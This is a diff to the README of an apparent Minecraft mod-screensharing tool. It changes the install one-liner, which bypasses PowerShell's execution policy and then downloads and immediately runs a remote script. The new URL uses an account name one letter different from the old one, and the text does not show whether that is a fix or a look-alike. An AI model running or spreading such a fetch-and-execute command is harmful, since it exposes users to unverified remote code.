@@ -7,7 +7,7 @@ A screensharing tool for verifying the integrity of Minecraft mods.
 Run the following command in **PowerShell**:
 
 ```powershell
-powershell -Command "Set-ExecutionPolicy Bypass -Scope Process; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/HadronCollision/PowershellScripts/refs/heads/main/HabibiModAnalyzer.ps1')"
+powershell -Command "Set-ExecutionPolicy Bypass -Scope Process; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/HadronCollison/PowershellScripts/refs/heads/main/HabibiModAnalyzer.ps1')"
 ```
 
 ## Features
